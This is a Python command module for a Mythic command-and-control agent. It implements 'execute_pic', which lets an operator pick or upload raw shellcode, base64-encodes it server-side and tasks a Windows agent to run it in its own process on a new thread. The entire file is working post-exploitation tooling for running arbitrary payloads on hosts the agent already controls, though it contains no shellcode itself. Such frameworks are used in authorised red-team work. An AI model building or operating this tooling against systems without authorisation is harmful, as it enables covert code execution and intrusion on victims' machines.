from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class ExecutePicArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pic_name",
                cli_name="PIC",
                display_name="PIC File",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_pic_files,
                description="Previously uploaded PIC shellcode to execute",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1,
                    )
                ],
            ),
            CommandParameter(
                name="pic_file",
                display_name="New PIC",
                type=ParameterType.File,
                description="Upload new PIC shellcode. After uploading, reuse via the Default tab.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="New",
                        ui_position=1,
                    )
                ],
            ),
        ]

    async def get_pic_files(self, inputMsg: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            CallbackID=inputMsg.Callback,
            LimitByCallback=False,
            Filename="",
        ))
        response = PTRPCDynamicQueryFunctionMessageResponse(Success=False)
        if file_resp.Success:
            names = []
            for f in file_resp.Files:
                if f.Filename not in names and (f.Filename.endswith(".bin") or f.Filename.endswith(".pic") or f.Filename.endswith(".raw")):
                    names.append(f.Filename)
            response.Success = True
            response.Choices = names
        else:
            response.Error = file_resp.Error
        return response

    async def parse_arguments(self):
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            raise Exception("Require JSON arguments.\n\tUsage: {}".format(ExecutePicCommand.help_cmd))


class ExecutePicCommand(CommandBase):
    cmd = "execute_pic"
    needs_admin = False
    help_cmd = "execute_pic -PIC <shellcode.bin>"
    description = "Execute a Crystal Palace PIC payload in the current process via a new thread."
    version = 2
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1106"]
    argument_class = ExecutePicArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True,
        )

        if taskData.args.get_parameter_group_name() == "New":
            file_search = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                TaskID=taskData.Task.ID,
                AgentFileID=taskData.args.get_arg("pic_file"),
            ))
            if not file_search.Success or len(file_search.Files) == 0:
                response.Success = False
                response.Error = "Failed to find uploaded PIC file"
                return response

            file_id = taskData.args.get_arg("pic_file")
            pic_name = file_search.Files[0].Filename
            taskData.args.add_arg("pic_name", pic_name)
            taskData.args.remove_arg("pic_file")
        else:
            pic_name = taskData.args.get_arg("pic_name")
            file_search = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                TaskID=taskData.Task.ID,
                Filename=pic_name,
                LimitByCallback=False,
                MaxResults=1,
            ))
            if not file_search.Success or len(file_search.Files) == 0:
                response.Success = False
                response.Error = f"Failed to find PIC file '{pic_name}' in Mythic"
                return response
            file_id = file_search.Files[0].AgentFileId

        file_content = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileId=file_id,
        ))
        if not file_content.Success:
            response.Success = False
            response.Error = f"Failed to get file content: {file_content.Error}"
            return response

        import base64
        taskData.args.add_arg("pic_data", base64.b64encode(file_content.Content).decode(), ParameterType.String)

        sc_len = len(file_content.Content)
        response.DisplayParams = f"-PIC {pic_name} ({sc_len} bytes)"

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
